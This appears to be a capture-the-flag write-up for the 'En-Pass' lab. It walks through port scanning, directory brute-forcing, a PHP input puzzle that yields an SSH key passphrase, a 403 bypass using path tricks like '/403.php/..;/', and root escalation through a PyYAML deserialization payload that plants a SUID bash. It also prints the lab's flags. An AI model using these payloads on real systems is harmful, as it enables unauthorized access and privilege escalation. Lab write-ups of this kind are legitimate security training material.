> En-Pass

**export IP=10.10.83.187**

# Rustscan

rustscan -a $IP --ulimit=5000 -- -sC -sV -Pn -oN rustscan.log

```
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8001/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
```

# Gobuster

gobuster dir -u http://$IP:8001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar -o gobuster/initial

```
/web (Status: 301) => Is forbidden but recursively directory bruteforced
/reg.php (Status: 200) => Has an interesting php code
/403.php (Status: 403) => Says 403 forbidden but maybe can br bypassed.
/zip (Status: 301) => Contains 100 zip files
```

# Nikto

nikto -h http://$IP:8001

```
+ Server may leak inodes via ETags, header found with file /, inode: a03, size: 5ba35bf922e1e, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
```

Looking at port 8001 we got 3 images and some embedded contents.

## Image 1: U2FkCg==Z => 
Sad
d
## Image 2: See every person as a mountain of sorts; we can see how they look from afar, but will never know them until we explore.
## Image 3: Ehvw ri Oxfn!! => Best of Luck!!

# Gobuster - /web

gobuster dir -u http://$IP:8001/web -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar -o gobuster/web

```
/resources
```

# Gobuster - /web/resources

gobuster dir -u http://$IP:8001/web/resources -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar -o gobuster/resources

```
/infoseek (Status: 301)
```

# Gobuster - /web/resources/infoseek

gobuster dir -u http://$IP:8001/web/resources/infoseek -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar -o gobuster/infoseek

```
/infoseek (Status: 301)
```

# Gobuster - /web/resources/infoseek/configure

gobuster dir -u http://$IP:8001/web/resources/infoseek/configure -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar -o gobuster/configure

```
/key
```

We got SSH private key but encrypted. Let's try to crack using John. 

ssh2john id_rsa > id_rsa.hash => But can't crack using john!

# Inspecting reg.php

## reg.php

```
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          $val = explode(",",$title);
          $sum = 0;
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          }
          if ( ($sum) == 9 ){
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice "; => 🎨We got an username
            }
                    else{
                      echo "  Try Try!!";     
                    }
          }
          else{
            echo "  Try Again!! ";
          }     
  }
```

The input is exploded i.e) input needs to be commas separated by a list!
The first condition is strlen($val[0]) == 2.  This means the length of the first item in the list needs to have a length of 2.
The next condition means the index [8] of the list needs to have a length of 3.
The index [5] value needs to be different than index [8]’s value.
The index [3] value needs to be different than index [7]’s value.


## Input => `**,*,*,**,*,*,*,*,***` or `**,*,*,*,*,*,*,**,***`

## Output => Nice. Password : cimihan_are_you_here? 

Ooh this may be the password to crack id_rsa and yes this looks like it !We can cross check by using john.

# 403 page bypass

## Tool: 403 fuzzer.py

python3 /opt/403fuzzer/403fuzz.py -u http://10.10.83.187:8001/403.php | grep 200


```
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /403.php/%2e%2e
Response Code: 200	Length: 2563	Path: /403.php/%2e%2e/
Response Code: 200	Length: 2563	Path: /403.php/..
Response Code: 200	Length: 2563	Path: /403.php/../
Response Code: 200	Length: 2563	Path: /403.php/../../..//
Response Code: 200	Length: 2563	Path: /403.php/../..//
Response Code: 200	Length: 2563	Path: /403.php/../.;/../
Response Code: 200	Length: 2563	Path: /403.php/..//
Response Code: 200	Length: 2563	Path: /403.php/..//../
Response Code: 200	Length: 2563	Path: /403.php/../;/../
Response Code: 200	Length: 917	Path: /403.php/..;/
Response Code: 200	Length: 2563	Path: /403.php//../../	
```

Accessing `http://10.10.83.187:8001/403.php/..;/`, we are given a message.

**Message: Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.**

Looks like `imsau` is an username.

ssh -i id_rsa imsau@$IP

# user.txt

```
1c5ccb6ce6f3561e302e0e516c633da9
```

# Further Enumeration

We got /opt/scripts and a `file.py`

```
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())
```

We can't find any cron.Let's transfer pspy. Running pspy64 we got a hit

```
CMD: UID=0    PID=26656  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
```

But we can't edit file.py. While trying to execute it we get an error!

```
Traceback (most recent call last):
  File "/opt/scripts/file.py", line 13, in <module>
    data  = yaml.load(Execute().run())
  File "/opt/scripts/file.py", line 8, in __init__
    self.read_file = open(file_name ,"r")
IOError: [Errno 2] No such file or directory: '/tmp/file.yml'
```

yaml.load is deprecated, we can use system commands as such!

# file.yml

```
!!python/object/apply:os.system ["cp /bin/bash /tmp/bash; chmod +s /tmp/bash;"]
```

We are root!!

# root.txt

```
5d45f08ee939521d59247233d3f8faf
```